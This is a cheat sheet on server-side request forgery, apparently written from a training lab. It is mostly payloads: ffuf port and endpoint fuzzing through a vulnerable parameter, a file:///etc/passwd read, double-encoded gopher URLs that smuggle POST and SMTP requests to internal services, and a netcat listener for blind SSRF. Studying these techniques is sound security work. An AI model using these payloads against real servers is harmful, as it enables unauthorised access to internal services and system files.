---
title: "SSRF Cheat Sheet"
date: "2026-05-05"
"tags": ["Web", "SSRF", "OWASP Top 10"]
category: "cheatsheet"
"excerpt": "Server Side Request Forgery Cheat Sheet"
---


To determine whether the HTTP response reflects the SSRF response to us, let us point the web application to itself:

```
http://127.0.0.1/index.php
```

#### Enumerate the system:

We can scan ports and see which other web services are running. If we supply a port that we assume is closed (such as `81`), the response contains an error message. After that we can so port scan with `ffuf`:

```shell
seq 1 10000 > ports.txt
```

```shell
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

#### Accessing Restricted Endpoints

We can manuplate the server to request endpoints we want. We can fuzzing the directory with `ffuf`:

```shell
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```

#### Local File Inclusion (LFI)

Since the URL scheme is part of the URL supplied to the web application, let us attempt to read local files from the file system using the `file://` URL scheme.

```
file:///etc/passwd
```

#### The gopher Protocol

If we need to POST request to endpoint we can use `gopher` URL scheme. For example our POST request seems like this:

```http
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

We need to URL-encode all special characters to construct a valid gopher URL from this. In particular, spaces (`%20`) and newlines (`%0D%0A`) must be URL-encoded.Afterward, we need to prefix the data with the gopher URL scheme, the target host and port, and an underscore, resulting in the following gopher URL:

```url
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

We are sending our URL within the HTTP POST parameter `dateserver`, which itself is URL-encoded, we need to URL-encode the entire URL again to ensure the correct format of the URL after the web server accepts it. Otherwise, we will get a `Malformed URL` error. After URL encoding the entire gopher URL one more time, we can finally send the following request:

```http
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

We can use the `gopher` protocol to interact with many internal services:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- SMTP
- Zabbix
- pymemcache
- rbmemcache
- phpmemcache
- dmpmemcache

We can use `gopherus.py` to generate `gopher` URL. Example:

```shell
python2.7 gopherus.py --exploit smtp

  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$


Give Details to send mail: 

Mail from :  attacker@academy.htb
Mail To :  victim@academy.htb
Subject :  HelloWorld
Message :  Hello from SSRF!

Your gopher link is ready to send Mail: 

gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A.

-----------Made-by-SpyD3r-----------
```

#### Blind SSRF

We can confirm the SSRF vulnerability by supplying a URL to a system under our control and setting up a `netcat` listener:

```shell
turalshkrov@htb[/htb]$ nc -lnvp 8000

listening on [any] 8000 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 32928
GET /index.php HTTP/1.1
Host: 172.17.0.1:8000
Accept: */*
```

If we attempt to point the web application to itself, we can observe that the response does not contain the HTML response of the coerced request.

## Exploiting Blind SSRF

Depending on the web application's behavior, we might still be able to conduct a (restricted) local port scan of the system, provided the response differs for open and closed ports.

```
http://127.0.0.1:81/index.php
```

The web application responds with:

```
Something went wrong!
```

If we get different response for open port, we can enumerate internal system with that.

Also we can not read files but if the server responsd differently for existing files, we can identify files on the server but not read them.